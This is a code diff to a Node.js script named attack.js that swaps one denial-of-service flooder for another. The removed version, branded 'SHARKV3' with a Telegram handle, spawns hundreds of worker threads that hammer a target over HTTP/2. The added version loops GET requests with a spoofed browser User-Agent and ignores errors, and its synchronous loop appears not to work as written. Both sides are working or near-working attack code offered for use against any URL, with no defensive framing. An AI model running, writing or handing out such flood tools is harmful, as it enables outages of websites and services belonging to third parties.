@@ -1,151 +1,42 @@
-const http2 = require('http2');
-const { Worker, isMainThread, workerData } = require('worker_threads');
-const readline = require('readline');
-const net = require('net');
+const http = require('http');
+const https = require('https');
+const { URL } = require('url');
 
-const THREADS = 100;
-const POWER_MULTIPLIER = 1;
-const MAX_INFLIGHT = 4000;
-const LIVE_REFRESH_RATE = 100;
+const [,, target, duration] = process.argv;
 
-let totalRequests = 0;
-let successCount = 0;
-let errorCount = 0;
-let maxRps = 0;
-let rpsLastSecond = 0;
-let end;  // Define the `end` variable here for the main thread
-
-// Helper function to get a random number within a range (inclusive)
-function getRandomInRange(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
+if (!target || !duration) {
+  console.log('Usage: node attack.js <url> <seconds>');
+  process.exit(1);
 }
 
-if (isMainThread) {
-    if (process.argv.length < 4) {
-        console.error('Usage: node attack.js <target> <duration_secs>');
-        process.exit(1);
-    }
+const url = new URL(target);
+const endTime = Date.now() + parseInt(duration) * 1000;
+const isHttps = url.protocol === 'https:';
+const client = isHttps ? https : http;
 
-    const target = process.argv[2];
-    const duration = parseInt(process.argv[3]);
+function flood() {
+  while (Date.now() < endTime) {
+    const options = {
+      hostname: url.hostname,
+      port: url.port || (isHttps ? 443 : 80),
+      path: url.pathname + url.search,
+      method: 'GET',
+      headers: {
+        'User-Agent': 'Mozilla/5.0',
+        'Accept': '*/*',
+        'Connection': 'keep-alive',
+      }
+    };
 
-    end = Date.now() + duration * 1000; // Define end time here in the main thread
-
-    console.clear();
-    console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
-    console.log(`SHARKV3! - NO CPU WARMUP .exx`);
-
-    // Start the workers with dynamic connection numbers
-    for (let i = 0; i < THREADS; i++) {
-        const initialConnections = getRandomInRange(20000, 500000);  // Random initial connections between 200 and 500
-        new Worker(__filename, { workerData: { target, duration, initial: true, connections: initialConnections } });
-    }
-
-    for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-        const additionalConnections = getRandomInRange(15004, 50000);  // Random additional connections between 154 and 500
-        new Worker(__filename, { workerData: { target, duration, initial: false, connections: additionalConnections } });
-    }
-
-    // Live Stats
-    setInterval(() => {
-        maxRps = Math.max(maxRps, rpsLastSecond);
-        renderStats();
-        rpsLastSecond = 0;
-    }, LIVE_REFRESH_RATE);
-
-    function renderStats() {
-        readline.cursorTo(process.stdout, 0, 0);
-        readline.clearScreenDown(process.stdout);
-
-        // Remaining time calculation
-        const timeRemaining = Math.max(0, (end - Date.now()) / 1000);  // in seconds
-        const minutesRemaining = Math.floor(timeRemaining / 60);
-        const secondsRemaining = Math.floor(timeRemaining % 60);
-
-        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
-        console.log(`===========================`);
-        console.log(`total: ${totalRequests}`);
-        console.log(`max-r: ${maxRps}`);
-        console.log(`===========================`);
-        console.log(`succes: ${successCount}`);
-        console.log(`Blocked: ${errorCount}`);
-        console.log(`===========================`);
-        console.log(`TIME REMAINING: ${minutesRemaining}:${secondsRemaining < 10 ? '0' : ''}${secondsRemaining}`);
-    }
-
-    const server = net.createServer(socket => {
-        socket.on('data', data => {
-            const msg = data.toString();
-            if (msg === 'req') totalRequests++, rpsLastSecond++;
-            else if (msg === 'ok') successCount++;
-            else if (msg === 'err') errorCount++;
-        });
+    const req = client.request(options, res => {
+      res.on('data', () => {}); // Keep connection open
     });
-    server.listen(9999);
 
-} else {
-    const { target, duration, initial, connections } = workerData;
-    const endTime = Date.now() + duration * 1000;  // end time for worker threads
+    req.on('error', () => {}); // Ignore errors
+    req.end();
+  }
 
-    const socket = net.connect(9999, '127.0.0.1');
-    const sendStat = msg => socket.write(msg);
-
-    function sendLoop(client, inflight) {
-        if (Date.now() > endTime || client.destroyed) return;
-
-        if (inflight.count < MAX_INFLIGHT) {
-            try {
-                inflight.count++;
-                const req = client.request({ ':method': 'HEAD', ':path': '/' });
-
-                req.on('response', () => {
-                    inflight.count--;
-                    sendStat('ok');
-                });
-
-                req.on('error', () => {
-                    inflight.count--;
-                    sendStat('err');
-                });
-
-                req.end();
-                sendStat('req');
-            } catch {
-                inflight.count--;
-                sendStat('err');
-            }
-        }
-
-        // Slight delay to avoid killing the system
-        setTimeout(() => sendLoop(client, inflight), 0.5);  // Increase delay slightly for stability
-    }
-
-    function createConnection() {
-        if (Date.now() > endTime) return;
-
-        let client;
-        try {
-            client = http2.connect(target);
-
-            const inflight = { count: 0 };
-
-            client.on('error', () => {
-                client.destroy();
-                setTimeout(createConnection, 500); // auto-recover fast
-            });
-
-            client.on('goaway', () => client.close());
-            client.on('close', () => setTimeout(createConnection, 500));
-
-            client.on('connect', () => {
-                for (let i = 0; i < connections; i++) sendLoop(client, inflight); // boosted request flow
-            });
-        } catch {
-            setTimeout(createConnection, 100);
-        }
-    }
-
-    for (let i = 0; i < connections; i++) {
-        createConnection();
-    }
+  console.log('Flood ended.');
 }
+
+flood();
